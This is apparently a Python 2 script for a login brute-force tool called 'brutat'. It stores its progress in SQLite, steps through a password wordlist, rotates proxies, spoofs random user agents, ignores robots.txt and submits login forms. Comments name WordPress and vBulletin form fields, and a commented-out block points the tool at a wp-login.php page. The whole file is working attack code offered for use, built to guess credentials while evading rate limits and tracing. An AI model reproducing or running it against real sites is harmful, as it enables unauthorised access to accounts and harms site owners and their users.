#!/usr/bin/python
# encoding=utf8

'''
	Author : el2t
	Web Site : fb.com/el2tlinux
	Version: 0.1
	Date: start 29/8/2017
'''
import sqlite3
import sys

import mechanize
import random
from BeautifulSoup import BeautifulSoup
import html2text
from termcolor import colored
import linecache as alllines
import os
import datetime
import sys, logging

start_time = datetime.datetime.now()

reload(sys)
sys.setdefaultencoding('utf-8')

# Function create database and tables and set ROWID
def create_db():

    conn = sqlite3.connect('brutat.db')
    print "Database created successfully"
    conn.execute("DROP TABLE IF EXISTS prog")
    conn.execute('''CREATE TABLE prog
           (site           TEXT    NOT NULL,
           passprog            INT     NOT NULL,
           proxyprog        INT	NOT NULL,
           password         TEXT	NOT NULL,
           username	TEXT	NOT NULL,
           passlist	TEXT	NOT NULL,
           proxylist	TEXT	NOT NULL,
           passlen	INT	NOT NULL,
           proxylen	INT	NOT NULL,
           userform TEXT    NOT NULL,
           passform TEXT    NOT NULL,
           loginf   TEXT    NOT NULL,
           loginl   TEXT    NOT NULL);''')
    print "Table created successfully"

    conn.execute("INSERT INTO prog (rowid,site,passprog,proxyprog,password,username,passlist,proxylist,passlen,proxylen,userform,passform,loginf,loginl) \
          VALUES (NULL, 'http://test.test', 1, 1, 'not-correct', 'admin', 'wordlist.txt', 'proxy.txt', 100, 100, 'username', 'password', 'login failed', 'login limited')");
    print "Default records set successfully"


    conn.commit()
    conn.close()



class data_con:

    def __init__(self, lrowid, lsite, lpassp, lproxyp, lcpassword, lusername, lpasslist, lproxylist, lpasslen, lproxylen, luserform, lpassform, lloginf, lloginl):

        # ROW
        self.lrowid = lrowid
        self.lsite = lsite
        self.lpassp = lpassp
        self.lproxyp = lproxyp
        self.lcpassword = lcpassword
        self.lusername = lusername
        self.lpasslist = lpasslist
        self.lproxylist = lproxylist
        self.lpasslen = lpasslen
        self.lproxylen = lproxylen
        self.luserform = luserform
        self.lpassform = lpassform
        self.lloginf = lloginf
        self.lloginl = lloginl



    # Load Row from database

    def load_record(self):
        conn = sqlite3.connect('brutat.db')
        cursor = conn.execute(
            "SELECT rowid, site, passprog, proxyprog, password, username, passlist, proxylist, passlen, proxylen, userform, passform, loginf, loginl from prog")
        for row in cursor:
            self.lrowid = row[0]
            self.lsite = row[1]
            self.lpassp = row[2]
            self.lproxyp = row[3]
            self.lcpassword = row[4]
            self.lusername = row[5]
            self.lpasslist = row[6]
            self.lproxylist = row[7]
            self.lpasslen = row[8]
            self.lproxylen = row[9]
            self.luserform = row[10]
            self.lpassform = row[11]
            self.lloginf = row[12]
            self.lloginl = row[13]
        conn.close()


    # Insert into database

    def update_row(self, site, passprog, proxyprog, password, username, passlist, proxylist, passlen, proxylen, userform, passform, loginf, loginl, rowid):
        conn = sqlite3.connect('brutat.db')
        try:
            with conn:

                cur = conn.cursor()
                if site != '':
                    cur.execute("UPDATE prog SET site=? WHERE rowid= ?", (site, rowid))
                    conn.commit()
                if passprog != '':
                    cur.execute("UPDATE prog SET passprog=? WHERE rowid= ?", (passprog, rowid))
                    conn.commit()
                if proxyprog != '':
                    cur.execute("UPDATE prog SET proxyprog=? WHERE rowid= ?", (proxyprog, rowid))
                    conn.commit()
                if password != '':
                    cur.execute("UPDATE prog SET password=? WHERE rowid= ?", (password, rowid))
                    conn.commit()

                if username != '':
                    uni_usr = u'%s' % username
                    cur.execute("UPDATE prog SET username=? WHERE rowid= ?", (uni_usr, rowid))
                    conn.commit()

                if passlist != '':
                    cur.execute("UPDATE prog SET passlist=? WHERE rowid= ?", (passlist, rowid))
                    conn.commit()
                    self.load_record()
                    self.len_files(passlist, proxylist)

                if proxylist != '':
                    cur.execute("UPDATE prog SET proxylist=? WHERE rowid= ?", (proxylist, rowid))
                    conn.commit()
                    self.load_record()
                    self.len_files(passlist, proxylist)

                if passlen != '':
                    cur.execute("UPDATE prog SET passlen=? WHERE rowid= ?", (passlen, rowid))
                    conn.commit()
                if proxylen != '':
                    cur.execute("UPDATE prog SET proxylen=? WHERE rowid= ?", (proxylen, rowid))
                    conn.commit()
                if userform != '':
                    cur.execute("UPDATE prog SET userform=? WHERE rowid= ?", (userform, rowid))
                    conn.commit()
                if passform != '':
                    cur.execute("UPDATE prog SET passform=? WHERE rowid= ?", (passform, rowid))
                    conn.commit()
                if loginf != '':
                    logf = u'%s' % loginf
                    cur.execute("UPDATE prog SET loginf=? WHERE rowid= ?", (logf, rowid))
                    conn.commit()
                if loginl != '':
                    logl = u'%s' % loginl
                    cur.execute("UPDATE prog SET loginl=? WHERE rowid= ?", (logl, rowid))
                    conn.commit()
            conn.close()
        except:
            conn.close()

    def len_files(self, lpasslist, lproxylist):

        # passwords numbers
        if lpasslist:
            fpass = open(lpasslist)
            lines = fpass.readlines()
            fpass.close()
            passd = len(lines)
            self.update_row('', '', '', '', '', '', '', passd, '', '', '', '', '', 1)

        # proxy numbers
        elif lproxylist:
            fproxy = open(lproxylist)
            lines = fproxy.readlines()
            fproxy.close()
            proxyd = len(lines)

            self.update_row('', '', '', '', '', '', '', '', proxyd, '', '', '', '', 1)
        self.load_record()





class start_scan:
    htmltotxt = ''
    specLine = ''
    printproxy = ''
    html = ''
    soup = ''
    def __init__(self, site, passp, proxyp, timeout, passlist, proxylist, proxylen, username, time, br = mechanize.Browser()):

        self.site = site
        self.passp = passp
        self.proxyp = proxyp
        self.proxylist = proxylist
        self.proxylen = proxylen
        self.passlist = passlist
        self.username = username
        self.time = time
        self.br = br
        self.timeout = timeout



    # configure mechanize Browser
    def useproxy(self):
        # set proxy
        proxyline = alllines.getline(self.proxylist, self.proxyp).split('\n')
        dic = []
        dic2 = []
        dic.append(proxyline)
        del dic[0][1]
        dic2.insert(0, 'http:')
        dic2.insert(1, dic[0][0])
        proxy = dic2[1]
        start_scan.printproxy = proxy
        self.br.set_proxies({'http': proxy})





    def timer(self):
        end_time = datetime.datetime.now()
        duration = '{}'.format(end_time - start_time)
        duration = duration.split('.')
        del duration[1]
        self.time = duration

    # random user-agents FUNCTION
    def LoadUserAgents(self, uafile='user_agents.txt'):

        uas = []
        with open(uafile, 'rb') as uaf:
            for ua in uaf.readlines():
                if ua:
                    uas.append(ua.strip()[1:-1 - 1])
        random.shuffle(uas)
        return uas

    def con(self, timeout):
        data_in = data_con('', '', '', '', '', '', '', '', '', '', '', '', '', '')
        if timeout == '':
            timeout = 1.0
        else:
            timeout = float(timeout)

        # br = mechanize.Browser()
        self.br.set_handle_equiv(True)
        self.br.set_handle_redirect(True)
        self.br.set_handle_referer(True)
        self.br.set_handle_robots(False)
        self.br.set_handle_refresh(False)

        # Login Form from target website
        with open('login_form.txt', 'r') as myfile:
            html_form = myfile.read().replace('\n', '')

        specLine = alllines.getline(self.passlist, self.passp).split('\n')
        dic = []
        dic.append(specLine)
        del dic[0][1]
        specLine = dic[0][0]

        # load user agents function
        uas = self.LoadUserAgents()

        # select a random user agent
        ua = random.choice(uas)

        # set headers
        headers = {"Connection": "close", "User-Agent": ua}

        # active headers
        self.br.addheaders = [(headers)]

        # set target login page and timeout
        r = self.br.open(self.site, timeout=timeout)

        print colored('''
        |---{~ Test it ~}+----{%s}+----{%s}--
        ''', 'yellow') % (self.username, self.specLine)

        r.set_data(html_form)
        self.br.set_response(r)
        self.br.select_form(nr=0)
        # input name
        data_in.load_record()
        self.br.form[data_in.luserform] = self.username
        self.br.form[data_in.lpassform] = specLine
        # vb ,br.form['vb_login_username'], " :>>:",br.form['vb_login_password']
        # wp ,br.form['log'], " :>>:",br.form['pwd']


        response = self.br.submit()
        html = self.br.response().read()
        soup = BeautifulSoup(html)
        unicode(soup)

        cek = html2text.html2text(str(soup))
        # print self.cek
        start_scan.htmltotxt = cek
        start_scan.specLine = specLine
        start_scan.html = html
        start_scan.soup = soup
        self.timer()


if __name__ == '__main__':
    # data_in = data_con('', '', '', '', '', '', '', '', '', '', '', '', '', '')
    print 'hi'
'''
data_in = data_con('', '', '', '', '', '', '', '', '', '')
data_in.load_record()
# data_in.view_records()
rowid = data_in.lrowid
#site = data_in.lsite
site = 'http://192.168.2.2/wp/wp-login.php'
passp = data_in.lpassp
proxyp = data_in.lproxyp
cpassword = data_in.lcpassword
username = data_in.lusername
passlist = data_in.lpasslist
proxylist = data_in.lproxylist
passlen = data_in.lpasslen
proxylen = data_in.lproxylen

self.luserform = data_in.luserform
self.lpassform = data_in.lpassform


data_in.update_row('', 1, 2, '', 'el2t', '', '', '', '', 1)

'''
